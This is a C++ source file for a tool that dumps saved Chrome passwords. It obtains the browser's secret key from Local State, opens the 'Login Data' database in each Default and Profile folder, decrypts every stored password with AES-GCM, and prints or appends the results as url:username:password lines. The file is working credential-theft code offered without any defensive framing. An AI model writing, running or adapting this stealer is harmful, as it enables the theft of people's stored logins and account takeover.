#include <iostream>
#include <string>
#include <cstring>
#include <filesystem>

#include "../include/decrypt.hpp"

namespace fs = std::filesystem;

int main(int argc, char *argv[]) {
    std::ofstream outfile;
    std::string dumpFilename = "output.txt";
    bool save_output = false;
    for (int i = 1; i < argc; i++) { // Parse arguments
        if (std::string(argv[i]) == "-o" && i + 1 < argc) { // Check boundary
            dumpFilename = argv[i + 1];
            save_output = true;
        }
    }    
    if (save_output) {
        outfile.open(dumpFilename, std::ios::app);
        if (!outfile.is_open()) {
            std::cerr << "Couldn't open output file" << std::endl;
            return 1;
        }
    }

    // Get the secret key from Chrome Local State.
    std::vector<unsigned char> secret_key = getSecretKey();
    if (secret_key.empty()) {
        std::cerr << "Chrome secret key cannot be found" << std::endl;
        return 1;
    }

    // Locate profile folders: those matching "Default" or starting with "Profile".
    std::string chromeUserData = getChromiumUserDataPath();
    if (chromeUserData.empty()) {
        return 1;
    }

    std::regex profileRegex("^(Default)|(Profile.*)$");
    for (const auto &entry : fs::directory_iterator(chromeUserData)) {
        if (entry.is_directory()) {
            std::string folderName = entry.path().filename().string();
            if (!std::regex_search(folderName, profileRegex))
                continue;

            fs::path loginDataPath = entry.path() / "Login Data";
            if (!fs::exists(loginDataPath))
                continue;

            sqlite3* db = getDBConnection(loginDataPath, "tmp.db");
            if (!db)
                continue;

            sqlite3_stmt* stmt;
            std::string query = "SELECT action_url, username_value, password_value FROM logins";
            if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, nullptr) != SQLITE_OK) {
                std::cerr << "Failed to prepare query" << std::endl;
                sqlite3_close(db);
                continue;
            }

            while (sqlite3_step(stmt) == SQLITE_ROW) {
                std::string url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                std::string username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                const void* blobData = sqlite3_column_blob(stmt, 2);
                int blobSize = sqlite3_column_bytes(stmt, 2);

                if (url.empty() || username.empty() || blobSize <= 0)
                    continue;
                    
                std::vector<unsigned char> ciphertext((unsigned char*)blobData, (unsigned char*)blobData + blobSize);
                std::string decrypted = aesGcmDecrypt(ciphertext, secret_key);

                // Write output in the format: url:username:decrypted_password
                if (save_output) {
                    outfile << url << ":" << username << ":" << decrypted << "\n";
                }
                std::cout << url << ":" << username << ":" << decrypted << std::endl;
            }
            sqlite3_finalize(stmt);
            sqlite3_close(db);

            // Remove the temporary database copy.
            fs::remove("tmp.db");
        }
    }
    if (save_output) {
        outfile.close();
    }
    return 0;
}
